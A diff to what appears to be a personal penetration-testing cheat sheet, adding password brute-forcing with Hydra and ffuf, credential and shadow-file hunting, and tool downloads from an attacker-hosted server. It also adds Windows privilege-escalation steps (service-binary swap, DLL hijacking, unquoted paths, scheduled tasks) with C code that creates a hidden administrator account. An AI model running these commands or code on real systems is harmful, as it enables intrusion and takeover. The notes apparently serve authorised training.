@@ -63,6 +63,8 @@ nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
 sudo nmap -O IP --osscan-guess
 # Vulnerability scan
 sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
+# Check scripts
+ls /usr/share/nmap/scripts/ | grep TERM
 ```
 
 #### Nuclei
@@ -154,9 +156,10 @@ sqlmap -u http://IP/index.php?user=1 -p user --os-shell
 crunch 6 6 -t lab%%% > wordlist
 ```
 
-###### Hydra
+###### Hydra & FFUF
 
 ```sh
+# Hydra
 # Attempt single user name with password list
 hydra -l USER -P PASSLIST -s PORT PROTO://IP
 # Attempt login on HTTP POST form
@@ -169,12 +172,17 @@ hydra -I -V -l USER -P PASSLIST "http-get://IP/webdav:A=BASIC:F=401"
 hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
 # SSH
 hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
+
+# FFUF
+# Use request saved with Burp (make sure to put in FUZZ)
+# Contains autoalign, force HTTP, and proxy via Burp
+ffuf -w /usr/share/wordlists/rockyou.txt -request flatpress_login -ac -x http://127.0.0.1:8080 -request-proto http
 ```
 
 ###### JohnTheRipper
 
 ``` sh
-# Run with ruleset
+# Crack SSH private key, run with ruleset
 john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 # Convert SSH hash
 ssh2john id_rsa > ssh.hash 
@@ -242,11 +250,13 @@ hashcat -m 1000 HASHFILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/
 
 ### Privilege Escalation
 
+#### Linux
+
 [HackTricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) 
 [compendium by g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 [PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)
 
-#### Enumeration
+##### Enumeration
 
 ```sh
 # Basics
@@ -260,77 +270,109 @@ groups
 env
 set
 ps aux | cat
+ls -la /home
+
 # Enumerate packages and kernel modules for vulnerabilities
 dpkg -l
 lsmod
 /sbin/modinfo <BINARY>
+
 # Enumerate network configuration
-ip a
+# Check interfaces
+ip addr
+# Check routes
+ip route
 route
 routel
+# Check listening ports
 netstat -tulnp
-ls -la /home
+
 # Enumerate users
 cat /etc/passwd
 cat /etc/shadow
+
 # Enumerate cronjobs
 cat /etc/crontab
 crontab -l
 sudo crontab -l
 ls -la /etc/cron*
 grep -i "CRON" /var/log/syslog
-# Display processes running in Linux with pspy
+
+# Display (other user) processes running in Linux with pspy
 # https://github.com/dominicbreuker/pspy
+python3 -m http.server 80
+wget http://IP/pspy32s
+./pspy32s
 # Look for cmdline processes
 cat /proc/self/cmdline 
+
 # Check SSH config
 # Check for: PermitRootLogin yes
 # Check for: (#)PasswordAuthentication yes
 cat /etc/ssh/sshd_config
+
 # SUID / GUID
 find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
 find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
+
 # Find all writable files/folders
 find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 find / -writable -type d 2>/dev/null
 ls -la /etc/passwd
 ls -la /etc/shadow
 ls -la /etc/sudoers
+
+# Find sensitive files
+grep --color=auto -rnw '.' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+
 # Look for commands in sudoers file
 sudo -l
+
 # Check sudo version
 sudo -V
+
 # Pivot to other user
 su USER
+
 # Check capabilities
 # https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
 getcap -r / 2>/dev/null
+
 # Check services
 systemctl list-units
 systemctl status SERVICE
 /etc/systemd/system/SERVICE.service
-# Find sensitive files (examples)
-grep -r "password" / 2>/dev/null
-grep -r "pass" /home 2>/dev/null
-grep -r "key" /opt 2>/dev/null
+
 # Find mounted drives
 mount
 cat /etc/fstab
 # Find available disks for mounting
 lsblk
+
 # Files in temporary directories
 ls -la /tmp
 ls -la /var/tmp
 ls -la /dev/shm
 
-# Run Linpeas
+# Find emails
+ls -la /var/mail
+
+# Run LinPEAS
+# https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 python3 -m http.server 80
 wget http://LOCALIP/linpeas.sh
 chmod +x linpeas.sh
-./linpeas.sh
+./linpeas.sh -a > /dev/shm/linpeas.txt 
+less -r /dev/shm/linpeas.txt
+# Run LinuxSmartEnumeration
+python3 -m http.server 80
+wget http://LOCALIP/lse.sh
+chmod +x lse.sh
+./lse.sh -l1
 ```
 
-#### SUID/GUID
+##### SUID/GUID
 
 Find binaries with SUID/GUID bit set. Use [GTFOBins](https://gtfobins.org/) to further exploit. Note that some binaries need to be run with `sudo` and therefore require the password of the local user.
 
@@ -341,6 +383,228 @@ find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
 find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
 ```
 
+#### Windows
+
+``` sh
+# Run cmd as other user (need password)
+runas /user:USER cmd
+```
+
+##### Enumeration
+
+``` ps1
+# Username and hostname
+whoami
+# Groups user is member of
+whoami /groups
+# Other users
+net user
+Get-LocalUser
+net user USERNAME
+# Other groups
+net localgroup
+Get-LocalGroup
+# Group members
+Get-LocalGroupMember GROUPNAME
+
+# System info
+systeminfo
+# Network info
+ipconfig /all
+route print
+netstat -ano
+# Installed apps (32/64 bit)
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+C:\Program Files
+C:\Program Files (x86)
+C:\Users\*\Downloads
+# Processes
+Get-Process
+
+# Interesting files / folders
+# Keepass DBs
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+# XAMMP config files
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+# Home directory documents
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+# PowerShell
+# User command history
+Get-History
+(Get-PSReadlineOption).HistorySavePath
+# Create WinRM session
+evil-winrm -i IP -u USER -p "PASS"
+
+# WinPEAS
+# Serve winPEAS from home directory and download
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+python3 -m http.server 80
+iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+```
+
+##### Windows Services
+
+``` ps1
+# List services
+services.msc (GUI)
+Get-Service
+Get-CimInstance
+# Example
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+# Enumerate binary permissions, look for write 
+icacls "PATH_TO_BINARY"
+Get-ACL
+
+# Replace binary with custom one (see code below)
+# Compile for 64-bit 
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+# Download and replace service on victim; example
+iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+# Restart service (needs permissions)
+net stop SERVICENAME
+# In case of lacking permissions, check if it autostarts at boot
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SERVICENAME'}
+# In case of autostart, check if we have SeShutdownPrivilege
+whoami /priv
+# Reboot
+shutdown /r /t 0
+# Check user is in admin group after reboot
+Get-LocalGroupMember administrators
+```
+
+##### DLL Hijacking
+
+``` ps1
+# Standard DLL search order (safe mode)
+# When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+# Abuse missing DLL (Filezilla example)
+# Enumerate installed apps
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+# Find DLL hijack vulnerability for : https://nvd.nist.gov/vuln/detail/CVE-2023-53959
+# Check if we have write permissions in app directory
+echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
+type 'C:\FileZilla\FileZilla FTP Client\test.txt'
+# Leverage Procmon to see loaded DLLs
+C:\tools\Procmon\Procmon64.exe
+# Filter for process (filezilla.exe) and clear events
+# Run app
+# Look for CreateFile operations (also includes accessing existing files)
+# Create malicious DLL to replace original one with (see code below)
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+# Download and replace
+iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+# Execute app with right privileges (can be other user)
+```
+
+##### Unquoted Service Paths
+
+``` ps1
+# Enumerate installed apps
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+# Alternative (cmd.exe)
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# Check start/stop permissions
+Start-Service GammaService
+Stop-Service GammaService
+
+# Check folder permissions of subpaths (example)
+icacls "C:\"
+icacls "C:\Program Files"
+icacls "C:\Program Files\Enterprise Apps"
+
+# Replace with malicious binary
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+
+# Start service and check if creating new user worked
+Start-Service GammaService
+net user
+net localgroup administrators
+```
+
+##### Scheduled Tasks
+
+``` ps1
+# List scheduled tasks
+# Seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields
+schtasks /query /fo LIST /v 
+Get-ScheduledTask
+
+# Check user permissions on scheduled task binary (example)
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+
+# Replace with malicious binary
+iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe
+move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+move .\BackendCacheCleanup.exe .\Pictures\
+
+# Check if it worked
+net user
+net localgroup administrators
+```
+
+##### Code Samples
+
+``` c
+// Code to replace service binary with
+// adduser.c
+// The following C code will create a user named dave2 and add that user to the local Administrators group using the system function.
+
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+``` c
+// Malicious DLL example
+
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
 
 ### Protocols
 
@@ -503,6 +767,12 @@ feroxbuster -u http://target.com
 
 # Scan with custom wordlist and extensions (PHP/ASP/JS common for OSCP)
 feroxbuster -u http://target.com -w wordlist.txt -x php,asp,aspx,js,txt,pdf
+```
+
+###### FFUF
+
+``` sh
+ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://domain.com/FUZZ
 ```
 
 ##### Subdomains
@@ -709,9 +979,23 @@ snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
 snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
 ```
 
-#### Databases (TCP: 3306 (MySQL))
+#### Databases
 
-##### MySQL
+##### MSSQL (TCP: 1433)
+
+```sh
+# MSSQL login
+impacket-mssqlclient USER:PASS@IP -windows-auth
+
+# Check version
+SELECT @@version;
+# List DBs. Defaults are: master, tempdb, model, and msdb
+SELECT name FROM sys.databases;
+# List tables in DB
+SELECT * FROM offsec.information_schema.tables;
+```
+
+##### MySQL (TCP: 3306)
 
 ```sh
 # MySQL login
@@ -727,18 +1011,18 @@ show databases;
 show tables from DBNAME;
 ```
 
-##### MSSQL
+##### PostgreSQL (TCP: 5432)
 
 ```sh
-# MSSQL login
-impacket-mssqlclient USER:PASS@IP -windows-auth
+# PostgreSQL login
+psql -h IP -p 2PORT5 -U USER
 
-# Check version
-SELECT @@version;
-# List DBs. Defaults are: master, tempdb, model, and msdb
-SELECT name FROM sys.databases;
+# List DBs
+\l
+# Connect to DB
+\c DB_NAME
 # List tables in DB
-SELECT * FROM offsec.information_schema.tables;
+select * from DB_NAME;
 ```
 
 
@@ -877,6 +1161,9 @@ source py2env/bin/activate
 python -V
 # Install impacket for Pyhon2
 pip install impacket==0.9.22
+# Python3 env
+python3 -m virtualenv py3env  
+source py3env/bin/activate
 
 # Open webdav folder, for example to host malicious .lnk file
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav
